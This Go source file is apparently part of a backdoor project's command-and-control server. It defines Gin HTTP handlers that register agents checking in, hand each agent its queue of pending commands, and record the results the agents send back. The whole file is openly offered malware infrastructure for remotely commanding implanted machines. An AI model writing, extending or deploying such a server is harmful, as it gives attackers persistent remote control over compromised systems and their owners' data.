package routers

import (
	"encoding/json"
	"fmt"
	"github.com/gin-gonic/gin"
	"github.com/zhangweijie11/zSec/backdoor/command_control/server/models"
	"net/http"
	"strconv"
)

func Ping(c *gin.Context) {
	var agent models.Agent
	err := c.BindJSON(&agent)
	fmt.Println("绑定 agent：", agent, err)
	agentId := agent.AgentId
	has, err := models.ExistAgentId(agentId)
	if err == nil && has {
		_ = models.UpdateAgent(agentId)
	} else {
		err = agent.Insert()
		fmt.Println(err)
	}
}

func GetCommand(c *gin.Context) {
	agnetId := c.Param("uuid")
	cmds, _ := models.ListCommandByAgentId(agnetId)
	cmdJson, _ := json.Marshal(cmds)
	fmt.Println("获取 agent 未执行的命令", agnetId, string(cmdJson))
	c.JSON(http.StatusOK, cmds)
}

func SendResult(c *gin.Context) {
	cmdId := c.Param("id")
	result := c.PostForm("result")
	id, _ := strconv.Atoi(cmdId)
	err := models.UpdateCommandResult(int64(id), result)
	fmt.Println("更新命令执行结果", cmdId, result, err, c.Request.PostForm)
	if err == nil {
		err = models.SetCmdStatusToFinished(int64(id))
	}
}
